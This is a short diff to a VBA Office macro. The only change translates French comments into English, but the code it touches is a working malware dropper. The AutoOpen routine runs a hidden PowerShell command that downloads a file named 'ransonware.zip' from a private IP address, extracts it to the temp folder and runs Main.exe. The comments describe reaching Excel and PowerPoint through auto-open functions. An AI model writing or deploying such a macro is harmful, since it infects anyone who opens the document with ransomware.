@@ -1,13 +1,13 @@
 Sub macro_powershell()
 
-    'Crée un Shell appelant des commandes powershell
+    'Create a shell to call powershell commands
     Dim powershellCommands
     powershellCommands = Shell("powershell Invoke-WebRequest -Uri http://192.168.85.128/ransonware.zip -OutFile $Env:temp\ransonware.zip ; Expand-Archive $Env:temp\ransonware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransonware\ ; .\Main.exe ; exit", 0)
 
 End Sub
 
-'Ajoute la compatibilité PowerPoint et Excel,
-'En utilisant les fonctions AutoOpen() et Workbook_Open()
+'Add compatibility for PowerPoint and Excel,
+'Using the AutoOpen() and Workbook_Open() functions
 
 Sub AutoOpen()
     macro_powershell
